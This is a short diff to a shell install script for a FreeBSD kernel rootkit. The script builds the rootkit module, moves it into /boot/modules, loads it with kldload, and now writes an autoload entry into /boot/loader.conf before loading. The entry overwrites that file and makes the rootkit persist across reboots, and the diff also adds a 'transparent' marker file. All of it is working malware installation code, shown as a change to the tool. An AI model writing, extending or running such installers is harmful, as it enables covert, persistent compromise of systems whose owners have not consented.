@@ -37,6 +37,7 @@ USR_SBIN="/usr/sbin/"
 
 INSTALL="/boot/modules"
 LOADER_CONF="/boot/loader.conf"
+LOADER_CONF_TRANSPARENT="/boot/loader.conf.transparent"
 
 cat << "EOF"
  _                   _ _____     _____     _____
@@ -55,9 +56,12 @@ echo ">> Build rootkit."
 make
 
 echo ">> Install rootkit kernel module."
+
+echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
+touch $LOADER_CONF_TRANSPARENT
+
 mv $KMOD/$KO $INSTALL/$KO
 kldload $INSTALL/$KO
-echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
 
 cd $BINARIES
 
